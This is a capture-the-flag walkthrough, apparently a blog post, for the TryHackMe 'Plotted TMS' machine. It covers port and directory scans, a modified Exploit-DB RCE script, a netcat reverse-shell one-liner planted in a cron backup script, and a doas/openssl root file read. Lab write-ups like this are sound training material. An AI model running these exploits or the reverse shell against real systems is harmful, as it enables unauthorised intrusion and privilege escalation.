---
layout: post
title:  "Plotted TMS"
categories: [tryhackme]
tags: [linux]
---

### Port Scan

```bash
┌──(kali㉿Zeus)-[~]
└─$ sudo nmap -sS -sV 10.10.1.194   

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### Directory Scan Port 445

```bash
┌──(kali㉿Zeus)-[~]
└─$ dirb http://10.10.1.194:445           
<snip>
==> DIRECTORY: http://10.10.1.194:445/management/
==> DIRECTORY: http://10.10.1.194:445/management/admin/
==> DIRECTORY: http://10.10.1.194:445/management/assets/
==> DIRECTORY: http://10.10.1.194:445/management/build/
==> DIRECTORY: http://10.10.1.194:445/management/classes/
==> DIRECTORY: http://10.10.1.194:445/management/database/
<snip>
```

### Traffic Offense Management System - Remote Code Execution (RCE) (Unauthenticated)

![image]( /assets/img/plottedtms/2.PNG)

![image]( /assets/img/plottedtms/3.PNG)

```bash
locate php/webapps/50221.py
cp /usr/share/exploitdb/exploits/php/webapps/50221.py .
2to3 -w 50221.py
```

There was an error with the script so i edit the line 107

- before

```python
request = requests.post(find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
```

- after

```python
request = requests.post("http://10.10.1.194:445"+find_shell.get("src") + "?cmd=" + cmd, data={'key':'value'}, headers=headers)
```

### RCE Confirmed 

![image]( /assets/img/plottedtms/4.PNG)

### Privileges Escalation - User Owned

![image]( /assets/img/plottedtms/5.PNG)

![image]( /assets/img/plottedtms/6.PNG)

- Change the backup.sh content 

```bash
rm -rf backup.sh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.45.56 5555 >/tmp/f" > backup.sh
chmod 777 backup.sh
chmod +x backup.sh
```

![image]( /assets/img/plottedtms/7.PNG)

### Privileges Escalation - Root Owned

```bash
plot_admin@plotted:~$ find / -perm -u=s -type f 2>/dev/null
<snip>
/usr/bin/doas
<snip>
```

- Resource : https://book.hacktricks.xyz/linux-unix/privilege-escalation#doas
- Resource : https://gtfobins.github.io/gtfobins/openssl/#file-read

```bash
permit nopass plot_admin as root cmd openssl
```

![image]( /assets/img/plottedtms/8.PNG)


```bash
LFILE=/root/root.txt
doas -u root openssl enc -in "$LFILE"
```


![image]( /assets/img/plottedtms/9.PNG)